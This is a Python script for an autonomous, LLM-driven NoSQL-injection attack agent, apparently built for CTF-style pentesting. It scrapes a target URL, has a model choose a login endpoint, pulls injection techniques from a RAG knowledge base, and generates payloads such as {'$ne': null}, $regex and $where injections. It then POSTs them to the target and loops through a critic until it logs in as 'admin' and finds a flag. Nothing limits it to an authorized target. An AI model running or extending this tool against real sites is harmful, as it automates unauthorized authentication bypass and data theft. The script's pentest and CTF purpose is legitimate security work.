import sys
import json
import asyncio
import warnings
import nest_asyncio
import requests
from langgraph.graph import START, END, StateGraph
from langchain_core.messages import HumanMessage

from agents.outputs import (
    PlannerOutput,
    CriticOutput,
    ScannerInputOutput,
    call_ollama_with_json
)
from typing import TypedDict, Optional, Any, List, Union, Type
from langchain.tools import BaseTool
from pydantic import BaseModel, Field
import time
nest_asyncio.apply()
warnings.filterwarnings("ignore", category=ResourceWarning)


if len(sys.argv) < 3:
    print("Usage: python main.py <url> <model>")
    sys.exit(1)

from static4 import ScanForNoSQLIInput, ScanForNoSQLITool

def fetch_initial_scrape(url: str) -> str:
    """
    Fetch initial unauthenticated website scrape.
    Intentionally simple: no JS, no auth, no crawling.
    """
    try:
        r = requests.get(
            url,
            timeout=10,
            headers={
                "User-Agent": "Mozilla/5.0 (compatible; PentestScanner/1.0)"
            }
        )
        r.raise_for_status()
        return r.text
    except Exception as e:
        return f"[ERROR FETCHING URL] {e}"


async def main():
    start_time = time.perf_counter()

    scanner_tool = ScanForNoSQLITool()
    
    # Initialize RAG tool
    print("[*] Initializing RAG tool...")
    from tools.all_tools import rag
    rag_tool = rag(
        json_path="nosql_injection_knowledge.json",  # Update with your actual path
        name="nosql_injection_knowledge",
        description="Retrieves information about NoSQL injection techniques, payloads, and best practices from a curated knowledge base. Use this to get expert guidance on crafting effective NoSQL injection payloads."
    )

    url = sys.argv[1]
    MODEL = sys.argv[2]

    goal = "login with username 'admin' using nosql injection and retrieve ctf flag"

    print("[*] Fetching initial website scrape...")
    website_scrape = fetch_initial_scrape(url)

    # workflow state
    class FullPentestState(TypedDict):
        url: str
        goal: str
        entry_point: str
        website_scrape: str
        messages: List[Any]
        scanner_tool_inputs: Optional[Any]
        manual_scan_report: Optional[str]
        planner_research: Optional[str]  # NEW: stores RAG research
        planner_output: Optional[Any]
        attack_results: Optional[List[Any]]
        critic_decision: Optional[str]
        final_report: Optional[str]
        iteration_count: int
        fields: List[str]

    async def scanner_input_structurer(state: FullPentestState):
        """Structure scanner inputs directly from website scrape."""
        
        prompt = f"""
You are a Scanner Input Structurer analyzing a website to determine NoSQL injection scanner inputs.

=== TARGET URL ===
{state['url']}

=== GOAL ===
{state['goal']}

=== INITIAL WEBSITE SCRAPE (RAW) ===
{state['website_scrape']}

Your task is to analyze the website scrape and determine the INPUTS that should be passed to a NoSQL Injection scanner tool.

Identify:
1. Any forms present (action URLs, HTTP methods)
2. Input fields (e.g., username, password, email, search, filters)
3. Referenced API endpoints
4. Authentication or login-related functionality

Select ONE primary endpoint that is most likely vulnerable to NoSQL injection.
Prefer login endpoints, search/filter endpoints, or API endpoints accepting JSON bodies.

Return the scanner tool inputs with:
- target_url: The main application URL
- endpoint: Specific endpoint URL to test
- fields: List of input field names
"""

        result = await call_ollama_with_json(
            MODEL,
            prompt,
            ScannerInputOutput,
        )
        return {"scanner_tool_inputs": result["scanner_tool_inputs"],
                "entry_point": result["scanner_tool_inputs"]['endpoint'],
                "fields": result["scanner_tool_inputs"]['fields']}

    async def manual_scanner(state: FullPentestState):
        """Run the manual NoSQL scanner tool."""
        
        res = await scanner_tool.arun({
            "url": state["entry_point"],
            "fields": state["fields"],
        })
        
        print("\n=== MANUAL SCANNER OUTPUT ===")
        print(res)
        
        return {"manual_scan_report": res}

    async def planner_agent(state: FullPentestState):
        """Research NoSQL injection techniques using RAG tool."""
        
        # Use LangChain's ChatOllama with tool binding for RAG
        from langchain_ollama.chat_models import ChatOllama
        from langchain_core.messages import HumanMessage, SystemMessage
        
        llm = ChatOllama(
            model=MODEL,
            temperature=0.3,
            timeout=120,
        )
        
        # Bind the RAG tool to the LLM
        llm_with_tools = llm.bind_tools([rag_tool])
        
        research_prompt = f"""
You are a Penetration Testing Planner researching NoSQL injection techniques.

=== TARGET URL ===
{state['entry_point']}

=== FIELDS REQUIRED ===
{state['fields']}

=== GOAL ===
{state['goal']}

=== MANUAL SCAN REPORT ===
{state['manual_scan_report']}

Your task is to research effective NoSQL injection techniques for this scenario.

Use the nosql_injection_knowledge tool to:
1. Query for authentication bypass techniques
2. Query for field-specific injection methods for the detected fields
3. Query for payload variations that work against common NoSQL databases (MongoDB, CouchDB, etc.)
4. Query for evasion techniques if defenses are detected

Make multiple queries to gather comprehensive information. Focus on:
- Payloads that bypass authentication
- Boolean-based blind injection
- JavaScript injection techniques
- Query operator manipulation
- Timing-based detection methods

Provide a summary of the most relevant techniques and payload patterns for this target.
"""
        
        messages = [
            SystemMessage(content="You are a security researcher with access to a NoSQL injection knowledge base."),
            HumanMessage(content=research_prompt)
        ]
        
        print("\n=== PLANNER RESEARCH PHASE ===")
        print("Querying RAG knowledge base for NoSQL injection techniques...")
        
        # Invoke with tools
        research_output = []
        response = await llm_with_tools.ainvoke(messages)
        
        # Process tool calls if any
        while response.tool_calls:
            research_output.append(f"\nQuery: {response.tool_calls[0]['args']}")
            
            for tool_call in response.tool_calls:
                tool_result = rag_tool.invoke(tool_call["args"])
                research_output.append(f"Result: {tool_result}\n")
                print(f"  RAG Query: {tool_call['args']}")
                print(f"  Retrieved: {tool_result[:200]}...")
            
            # Continue conversation with tool results
            messages.append(response)
            messages.append(HumanMessage(content="Continue researching or provide your final summary."))
            response = await llm_with_tools.ainvoke(messages)
        
        # Get final summary
        research_output.append(f"\nFinal Summary: {response.content}")
        research_text = "\n".join(research_output)
        
        print("\n=== RESEARCH COMPLETE ===")
        print(research_text[:500] + "...")
        
        return {"planner_research": research_text}

    async def planner_structurer(state: FullPentestState):
        """Generate structured payloads based on RAG research."""
        
        prompt = f"""
You are a Penetration Testing Payload Generator creating NoSQL injection payloads.

=== TARGET URL ===
{state['entry_point']}

=== FIELDS REQUIRED ===
{state['fields']}

=== GOAL ===
{state['goal']}

=== MANUAL SCAN REPORT ===
{state['manual_scan_report']}

=== RESEARCH FROM KNOWLEDGE BASE ===
{state['planner_research']}

Based on the research findings above, generate 5 specific NoSQL injection payloads to test.
Each payload should be ready to send in a POST request body.

Use the techniques identified in the research phase. Target different NoSQL injection techniques:
1. Authentication bypass (e.g., {{"$ne": null}})
2. Blind boolean-based injection
3. Timing-based injection
4. Query operator injection (e.g., $gt, $regex, $where)
5. JavaScript injection

Each payload must include:
- field_names: List of fields to inject into (matching the detected fields)
- payloads: List of actual injection strings/objects (one per field, in order)
- description: What vulnerability/technique this tests

Return the endpoint URL and 5 payloads based on the research.
"""
        
        result = await call_ollama_with_json(
            MODEL,
            prompt,
            PlannerOutput,
        )
        
        return {"planner_output": result}

    async def attacker_agent(state: FullPentestState):
        """Execute the planned payloads against the target."""
        planner_output = state["planner_output"]
        print('PLANNER OUTPUT')
        print(planner_output)
        endpoint = planner_output["endpoint"]
        payloads = planner_output["payloads"]
        
        attack_results = []
        
        print("\n=== EXECUTING ATTACKS ===")
        for i, payload_obj in enumerate(payloads):
            print(f"\n[*] Testing payload {i+1}/{len(payloads)}: {payload_obj['description']}")
            
            try:
                field_names = payload_obj["field_names"]
                payloads = payload_obj["payloads"]

                parsed_payloads = []
                for item in payloads:
                    try:
                        parsed = json.loads(item)
                        parsed_payloads.append(parsed)
                    except (json.JSONDecodeError, TypeError):
                        parsed_payloads.append(item)

                post_data = dict(zip(field_names, parsed_payloads))
                
                print('\ntrying...')
                print(f"endpoint: {endpoint}")
                print(f"post_data: {post_data}")
                response = requests.post(
                    endpoint,
                    json=post_data,
                    timeout=10,
                    headers={"User-Agent": "Mozilla/5.0 (compatible; PentestScanner/1.0)", "Content-Type": "application/json"}
                )

                result = {
                    "payload": payload_obj,
                    "status_code": response.status_code,
                    "response_body": response.text, 
                    "success": response.status_code == 200
                }
                
                print(f"  Status: {response.status_code}")
                print(f"  Response preview: {response.text[:100]}")
                
            except Exception as e:
                result = {
                    "payload": payload_obj,
                    "error": str(e),
                    "success": False
                }
                print(f"  Error: {e}")
            
            attack_results.append(result)
        
        return {"attack_results": attack_results}

    async def critic_agent(state: FullPentestState):
        """Evaluate results and decide next action."""
        
        prompt = f"""
You are a Penetration Test Critic Agent evaluating attack results.

=== GOAL ===
{state['goal']}

=== MANUAL SCAN REPORT ===
{state['manual_scan_report']}

=== RESEARCH CONDUCTED ===
{state['planner_research'][:500]}...

=== PAYLOADS USED ===
{json.dumps(state['planner_output'], indent=2)}

=== ATTACK RESULTS ===
{json.dumps(state['attack_results'], indent=2)}

=== ITERATION COUNT ===
{state['iteration_count']}

Analyze the results and decide the next action:

**Decision Options:**
1. "rescan" - Need more information from manual scanning (iteration < 2)
2. "replan" - Payloads failed but we can try different approaches (iteration < 5)
3. "success" - Goal was achieved, proceed to report writing
4. "failure" - Max iterations reached or attack not feasible (iteration >= 5)

**Success Indicators:**
- 200 status with authentication tokens or session cookies
- Response contains target data (e.g., CTF flag, admin access)
- Access granted to restricted resources

**Evaluation Criteria:**
- Has the goal been achieved?
- Are we making progress?
- Should we gather more info or try different payloads?
- Have we exhausted reasonable attempts?

Provide your decision, clear reasoning, and specific suggestions for improvement.
"""
        
        result = await call_ollama_with_json(
            MODEL,
            prompt,
            CriticOutput,
        )
        
        return {
            "critic_decision": result["decision"],
            "iteration_count": state["iteration_count"] + 1
        }

    async def report_writer_agent(state: FullPentestState):
        
        prompt = f"""
You are a Penetration Test Report Writer creating a comprehensive security assessment report.

=== TARGET URL ===
{state['url']}

=== GOAL ===
{state['goal']}

=== MANUAL SCAN REPORT ===
{state['manual_scan_report']}

=== RESEARCH CONDUCTED ===
{state['planner_research']}

=== ALL PAYLOADS TESTED ===
{json.dumps(state['planner_output'], indent=2)}

=== ATTACK RESULTS ===
{json.dumps(state['attack_results'], indent=2)}

[ROLE & BACKGROUND]

You are the **Report Writer Agent**, a concise technical writer specializing in pentest documentation. Your goal is to transform the raw exploit attempts and final success into a clear, professional markdown report.

[TASK OBJECTIVE]

Using the attempt history and the confirmed successful payload, produce a concise yet insightful report that includes:

1. **Executive Summary**
    - One-paragraph overview of objectives and outcome.
2. **Methodology**
    - Briefly describe each phase (Scanning → Research → Planning → Attacking → Evaluation → Critique).
3. **Key Findings**
    - Bullet-list of tested entry points, observed failure modes, and the one that succeeded.
4. **Successful Exploit Details**
    - Show the final payload mapped to each field, explain why it worked.
5. **Security Implications & Recommendations**
    - Outline the vulnerability's impact and suggest remediation steps.
6. **Lessons Learned & Next Steps**
    - Note any patterns (e.g., WAF quirks, filtering) and propose further testing or defensive measures.

[OUTPUT FORMAT]
**Markdown Document**: Generate markdown with appropriately leveled headings (`#`, `##`, ), code blocks for payload examples, and tables or lists where helpful.
No Additional text.
"""
        
        result = await call_ollama_with_json(
            MODEL,
            prompt,
            dict, 
            print_output=False  
        )
        
        print("\n=== FINAL REPORT GENERATED ===")
        print(json.dumps(result, indent=2))
        
        return {"final_report": json.dumps(result, indent=2)}

    def route_after_critic(state: FullPentestState):
        """Route based on critic's decision."""
        decision = state["critic_decision"]
        
        if decision == "rescan":
            return "manual_scanner"
        elif decision == "replan":
            return "planner_agent"  # Goes back to research phase
        elif decision == "success":
            return "report_writer"
        else:  
            return END

    graph = StateGraph(FullPentestState)
    
    # add all nodes
    graph.add_node("scanner_input_structurer", scanner_input_structurer)
    graph.add_node("manual_scanner", manual_scanner)
    graph.add_node("planner_agent", planner_agent) 
    graph.add_node("planner_structurer", planner_structurer)  
    graph.add_node("attacker_agent", attacker_agent)
    graph.add_node("critic_agent", critic_agent)
    graph.add_node("report_writer", report_writer_agent)

    # edges
    graph.add_edge(START, "scanner_input_structurer")
    graph.add_edge("scanner_input_structurer", "manual_scanner")
    graph.add_edge("manual_scanner", "planner_agent")
    graph.add_edge("planner_agent", "planner_structurer")  
    graph.add_edge("planner_structurer", "attacker_agent")
    graph.add_edge("attacker_agent", "critic_agent")
    
    graph.add_conditional_edges(
        "critic_agent",
        route_after_critic,
        {
            "manual_scanner": "manual_scanner",
            "planner_agent": "planner_agent",  
            "report_writer": "report_writer",
            END: END
        }
    )
    
    graph.add_edge("report_writer", END)

    workflow = graph.compile()

    final_state = await workflow.ainvoke(
        {
            "messages": [
                HumanMessage(content="Execute NoSQL injection penetration test")
            ],
            "url": url,
            "goal": goal,
            "website_scrape": website_scrape,
            "scanner_tool_inputs": None,
            "manual_scan_report": None,
            "planner_research": None,  
            "planner_output": None,
            "attack_results": None,
            "critic_decision": None,
            "final_report": None,
            "iteration_count": 0,
            "entry_point": "",
            "fields": [],
        }
    )

    # calculate and output time taken for data collection
    end_time = time.perf_counter()
    elapsed_time = end_time - start_time
    print("\n=== TIME TAKEN ===")
    print(f"{elapsed_time:.4f} seconds")


if __name__ == "__main__":
    asyncio.run(main())